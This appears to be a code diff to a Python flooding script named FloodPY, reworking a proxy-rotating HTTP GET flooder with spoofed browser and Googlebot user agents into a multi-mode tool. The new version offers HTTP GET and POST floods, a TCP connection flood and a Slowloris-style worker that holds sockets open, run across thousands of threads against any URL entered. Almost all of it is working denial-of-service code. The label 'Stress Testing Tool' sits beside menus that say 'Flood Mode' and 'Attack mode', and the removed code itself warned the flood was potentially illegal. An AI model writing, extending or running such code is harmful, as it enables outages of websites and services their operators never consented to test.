@@ -1,177 +1,213 @@
 import concurrent.futures
 import random
 import threading
-import requests
+import httpx
+import socket
+from urllib.parse import urlparse
 import sys
 import os
 import platform
 import time
 import colorama
+import argparse
 
 if platform.system() == "Windows":
     colorama.init()
     from colorama import Fore, Style
-    GREEN = Fore.GREEN
-    RED = Fore.RED
-    YELLOW = Fore.YELLOW
-    CYAN = Fore.CYAN
-    MAGENTA = Fore.MAGENTA
-    RESET = Style.RESET_ALL
+    GREEN, RED, YELLOW, CYAN, MAGENTA, RESET = Fore.GREEN, Fore.RED, Fore.YELLOW, Fore.CYAN, Fore.MAGENTA, Style.RESET_ALL
 else:
-    GREEN = "\033[92m"
-    RED = "\033[91m"
-    YELLOW = "\033[93m"
-    CYAN = "\033[96m"
-    MAGENTA = "\033[95m"
-    RESET = "\033[0m"
+    GREEN, RED, YELLOW, CYAN, MAGENTA, RESET = "\033[92m", "\033[91m", "\033[93m", "\033[96m", "\033[95m", "\033[0m"
 
-os.system('cls' if os.name == 'nt' else 'clear')
+stop_event = threading.Event()
+requests_get_sent = 0
+requests_post_sent = 0
+connections_hit_made = 0
+connections_held_made = 0
+errors_count = 0
+counter_lock = threading.Lock()
 
-banner = fr"""{CYAN}
+USER_AGENTS = [
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36",
+    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36"
+]
+
+def http_get_worker(url):
+    global requests_get_sent, errors_count
+    headers = {"User-Agent": random.choice(USER_AGENTS), "Accept": "*/*", "Connection": "keep-alive"}
+    try:
+        with httpx.Client(http2=True, verify=False, timeout=5) as client:
+            while not stop_event.is_set():
+                try:
+                    client.get(f"{url}?{random.randint(1, 99999999)}", headers=headers)
+                    with counter_lock:
+                        requests_get_sent += 1
+                except Exception:
+                    with counter_lock:
+                        errors_count += 1
+    except Exception:
+        with counter_lock:
+            errors_count += 1
+
+def http_post_worker(url):
+    global requests_post_sent, errors_count
+    headers = {"User-Agent": random.choice(USER_AGENTS), "Accept": "*/*", "Connection": "keep-alive"}
+    try:
+        with httpx.Client(http2=True, verify=False, timeout=5) as client:
+            while not stop_event.is_set():
+                try:
+                    data = {f"data{i}": str(random.random()) for i in range(5)}
+                    client.post(url, headers=headers, json=data)
+                    with counter_lock:
+                        requests_post_sent += 1
+                except Exception:
+                    with counter_lock:
+                        errors_count += 1
+    except Exception:
+        with counter_lock:
+            errors_count += 1
+
+def tcp_hit_worker(host, port):
+    global connections_hit_made, errors_count
+    while not stop_event.is_set():
+        try:
+            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
+                s.settimeout(2)
+                s.connect((host, port))
+                with counter_lock:
+                    connections_hit_made += 1
+        except Exception:
+            with counter_lock:
+                errors_count += 1
+
+def tcp_hold_worker(host, port):
+    global connections_held_made, errors_count
+    try:
+        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        s.settimeout(3)
+        s.connect((host, port))
+        with counter_lock:
+            connections_held_made += 1
+        s.sendall(f"GET /?{random.randint(1,9999)} HTTP/1.1\r\nHost: {host}\r\n".encode())
+        while not stop_event.is_set():
+            try:
+                s.sendall(f"X-a: {random.randint(1,9999)}\r\n".encode())
+                time.sleep(10)
+            except socket.error:
+                break
+    except Exception:
+        with counter_lock:
+            errors_count += 1
+    finally:
+        with counter_lock:
+            if connections_held_made > 0:
+                connections_held_made -= 1
+
+def display_stats(num_threads, mode, start_time):
+    while not stop_event.is_set():
+        elapsed_time = time.monotonic() - start_time
+        if elapsed_time < 1:
+            time.sleep(1)
+            continue
+
+        rps_get = int(requests_get_sent / elapsed_time)
+        rps_post = int(requests_post_sent / elapsed_time)
+        cps_hit = int(connections_hit_made / elapsed_time)
+
+        status_line = f"\r{MAGENTA}Threads:{RESET} {num_threads:<7} | {RED}Errors:{RESET} {errors_count:<7}"
+        
+        if mode == 1:
+            status_line += f" | {GREEN}GET/s:{RESET} {rps_get:<7}"
+        elif mode == 2:
+            status_line += f" | {CYAN}POST/s:{RESET} {rps_post:<7}"
+        elif mode == 3:
+            status_line += f" | {YELLOW}TCP Hit/s:{RESET} {cps_hit:<7} | {YELLOW}Held:{RESET} {connections_held_made:<5}"
+        elif mode == 4:
+            total_rps = rps_get + rps_post
+            status_line += f" | {GREEN}RPS:{RESET} {total_rps:<7} | {YELLOW}TCP Hit/s:{RESET} {cps_hit:<7} | {YELLOW}Held:{RESET} {connections_held_made:<5}"
+        
+        sys.stdout.write(status_line.ljust(100))
+        sys.stdout.flush()
+        time.sleep(1)
+
+def main():
+    parser = argparse.ArgumentParser(description="Stress Testing Tool.")
+    parser.add_argument("-u", "--url", help="Target URL")
+    parser.add_argument("-t", "--threads", type=int, help="Number of threads per attack type")
+    parser.add_argument("-m", "--mode", type=int, help="Attack mode (1-4)")
+    args = parser.parse_args()
+
+    os.system('cls' if os.name == 'nt' else 'clear')
+    banner = fr"""{CYAN}
 ___________.__                    .__________________.___.
 \_   _____/|  |   ____   ____   __| _/\______   \__  |   |
  |    __)  |  |  /  _ \ /  _ \ / __ |  |     ___//   |   |
  |     \   |  |_(  <_> |  <_> ) /_/ |  |    |    \____   |
  \___  /   |____/\____/ \____/\____ |  |____|    / ______|
-     \/                            \/            \/       
-{RESET}"""
-print(banner)
+     \/                            \/            \/
+{RESET}{MAGENTA}                          Made by Kyra{RESET}"""
+    print(banner)
 
-DEFAULT_THREADS = 1000
-
-while True:
-    try:
-        num_threads_str = input(f"{CYAN}Enter number of threads (High for flood, Default: {DEFAULT_THREADS}) > {RESET}")
-        if not num_threads_str:
-            num_threads = DEFAULT_THREADS
-            break
-        num_threads = int(num_threads_str)
-        if num_threads > 0:
-            break
-        else:
-            print(f"{RED}Number must be greater than 0.{RESET}")
-    except ValueError:
-        print(f"{RED}Invalid integer.{RESET}")
-
-while True:
-    url = input(f"{CYAN}Enter target URL (e.g., https://example.com) > {RESET}")
-    if url.startswith("http://") or url.startswith("https://"):
-        break
+    if args.url and args.threads and args.mode:
+        url, num_threads, mode = args.url, args.threads, args.mode
+        print(f"{CYAN}CLI mode: Target={YELLOW}{url}{CYAN} Threads={YELLOW}{num_threads}{CYAN} Mode={YELLOW}{mode}{CYAN}.{RESET}")
     else:
-        print(f"{RED}Invalid URL. Must start with http:// or https://{RESET}")
+        DEFAULT_THREADS = 2048
+        num_threads = int(input(f"{CYAN}Enter number of threads (Default: {DEFAULT_THREADS}) > {RESET}") or DEFAULT_THREADS)
+        url = input(f"{CYAN}Enter target URL (e.g., https://example.com) > {RESET}")
+        print(f"""{CYAN}
+Select Flood Mode:
+{YELLOW}1.{RESET} HTTP GET Flood
+{YELLOW}2.{RESET} HTTP POST Flood
+{YELLOW}3.{RESET} TCP Connection Flood
+{YELLOW}4.{RESET} All Attacks Combined
+""")
+        mode = int(input(f"{CYAN}> {RESET}"))
+    
+    parsed_url = urlparse(url)
+    host, port = parsed_url.hostname, parsed_url.port or (443 if parsed_url.scheme == 'https' else 80)
+    
+    total_threads = num_threads * 4 if mode == 4 else num_threads
+    
+    if total_threads > 15000:
+        print(f"{YELLOW}[!] WARNING: Launching {total_threads} threads is extremely memory intensive and may fail.{RESET}")
 
-user_agents = [
-    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36",
-    "Mozilla/5.0 (Windows NT 10.0; rv:115.0) Gecko/20100101 Firefox/115.0",
-    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36",
-    "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0",
-    "Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1",
-    "Mozilla/5.0 (Linux; Android 13; SM-S908U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Mobile Safari/537.36"
-    "FloodAgent/2.0 (Aggressive; Concurrent; +https://github.com/)",
-    "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
-    "Mozilla/5.0"
-]
-referers = ["https://google.com/", "https://bing.com/", "https://duckduckgo.com/", url]
-use_proxies_input = input(f"{CYAN}Use proxies? (y/n) > {RESET}").lower()
-use_proxies = use_proxies_input == 'y'
-proxies_list = []
+    print(f"\n{MAGENTA}[*] Launching flood on {YELLOW}{url}{MAGENTA} with {CYAN}{total_threads}{MAGENTA} total threads...{RESET}")
+    print(f"{RED}[!] This is an aggressive test. Press Ctrl+C to stop.{RESET}")
+    time.sleep(2)
 
-if use_proxies:
-    proxy_file = "proxies.txt"
-    try:
-        with open(proxy_file, 'r') as f:
-            proxies_list = [line.strip() for line in f if line.strip()]
-        if not proxies_list:
-            print(f"{YELLOW}[!] No valid proxies found in {proxy_file}. Continue without proxies? (y/n){RESET}")
-            if input(f"{CYAN}> {RESET}").lower() != 'y': sys.exit()
-            use_proxies = False
-        else:
-            print(f"{GREEN}[+] {len(proxies_list)} proxies loaded.{RESET}")
-    except FileNotFoundError:
-        print(f"{RED}[!] {proxy_file} not found. Continue without proxies? (y/n){RESET}")
-        if input(f"{CYAN}> {RESET}").lower() != 'y': sys.exit()
-        use_proxies = False
-    except Exception as e:
-         print(f"{RED}[!] Error reading proxy file: {e}{RESET}")
-         sys.exit()
+    start_time = time.monotonic()
+    
+    with concurrent.futures.ThreadPoolExecutor(max_workers=total_threads + 1) as executor:
+        executor.submit(display_stats, total_threads, mode, start_time)
+        
+        if mode == 1:
+            for _ in range(num_threads): executor.submit(http_get_worker, url)
+        elif mode == 2:
+            for _ in range(num_threads): executor.submit(http_post_worker, url)
+        elif mode == 3:
+            for i in range(num_threads):
+                if i % 2 == 0: executor.submit(tcp_hit_worker, host, port)
+                else: executor.submit(tcp_hold_worker, host, port)
+        elif mode == 4:
+            for _ in range(num_threads):
+                executor.submit(http_get_worker, url)
+                executor.submit(http_post_worker, url)
+                executor.submit(tcp_hit_worker, host, port)
+                executor.submit(tcp_hold_worker, host, port)
 
-requests_sent = 0
-errors_count = 0
-start_time = time.monotonic()
-counter_lock = threading.Lock()
-
-def flood():
-    global requests_sent
-    global errors_count
-    session = requests.Session()
-    session.headers.update({
-        "Accept": "*/*",
-        "Accept-Language": "en-US,en;q=0.5",
-        "Accept-Encoding": "gzip, deflate, br",
-        "Connection": "keep-alive",
-        "Pragma": "no-cache",
-        "Cache-Control": "no-cache",
-        "User-Agent": random.choice(user_agents)
-    })
-    while True:
-        proxy = None
-        proxy_dict = None
-        if use_proxies and proxies_list:
-            proxy = random.choice(proxies_list)
-            proxy_dict = {"http": f"http://{proxy}", "https": f"http://{proxy}"}
-        local_headers = {
-            "User-Agent": random.choice(user_agents),
-            "Referer": random.choice(referers)
-        }
-        target_url = f"{url}?{random.randint(1, 99999999)}={random.randint(1, 99999999)}"
         try:
-            response = session.get(target_url, headers=local_headers, proxies=proxy_dict, timeout=2.5, verify=False, stream=False)
-            with counter_lock:
-                requests_sent += 1
-            status_code = response.status_code
-            status_color = GREEN if 200 <= status_code < 300 else YELLOW if 300 <= status_code < 500 else RED
-            status_text = f"{status_color}{status_code}{RESET}"
-            error_text = ""
-        except requests.exceptions.RequestException:
-            with counter_lock:
-                errors_count += 1
-            status_text = f"{RED}ERR{RESET}"
-            error_text = f"{RED}NetErr{RESET}"
-        except Exception:
-            with counter_lock:
-                errors_count += 1
-            status_text = f"{RED}ERR{RESET}"
-            error_text = f"{RED}UnkErr{RESET}"
-        with counter_lock:
-            elapsed_time = time.monotonic() - start_time
-            rps = int(requests_sent / elapsed_time) if elapsed_time > 0 else 0
-            sys.stdout.write(
-                f"\r{CYAN}Target:{RESET} {url[:30].ljust(30)} | "
-                f"{MAGENTA}Threads:{RESET} {num_threads:<4} | "
-                f"{GREEN}Sent:{RESET} {requests_sent:<8} | "
-                f"{RED}Errors:{RESET} {errors_count:<6} | "
-                f"{YELLOW}RPS:{RESET} {rps:<5} | "
-                f"{CYAN}Status:{RESET} {status_text:<12} {error_text:<12}"
-            )
-            sys.stdout.flush()
-print(f"\n{MAGENTA}[*] Launching FLOOD on {YELLOW}{url}{MAGENTA} with {CYAN}{num_threads}{MAGENTA} threads...{RESET}")
-print(f"{RED}[!] WARNING: This is EXTREMELY AGGRESSIVE and potentially ILLEGAL.{RESET}")
-print(f"{YELLOW}[!] Press Ctrl+C to stop.{RESET}")
-requests.packages.urllib3.disable_warnings(requests.packages.urllib3.exceptions.InsecureRequestWarning)
-executor = concurrent.futures.ThreadPoolExecutor(max_workers=num_threads)
-futures = []
-try:
-    for _ in range(num_threads):
-       futures.append(executor.submit(flood))
-    concurrent.futures.wait(futures)
-except KeyboardInterrupt:
-    print(f"\n\n{YELLOW}[!] Ctrl+C detected. Shutting down threads...{RESET}")
-    executor.shutdown(wait=False, cancel_futures=True)
-except Exception as e:
-    print(f"\n\n{RED}[!] Critical Error: {e}{RESET}")
-    executor.shutdown(wait=False, cancel_futures=True)
-finally:
-    if not executor._shutdown:
-       executor.shutdown(wait=False, cancel_futures=True)
-    print(f"{MAGENTA}[*] Flood script terminated.{RESET}")
-    sys.exit(0)
+            while not stop_event.is_set():
+                time.sleep(1)
+        except KeyboardInterrupt:
+            print(f"\n\n{YELLOW}[!] Ctrl+C detected. Shutting down threads...{RESET}")
+        finally:
+            stop_event.set()
+            executor.shutdown(wait=False, cancel_futures=True)
+
+if __name__ == "__main__":
+    try:
+        main()
+    except (KeyboardInterrupt, SystemExit):
+        pass
+    finally:
+        print(f"{MAGENTA}[*] Flood script terminated.{RESET}")
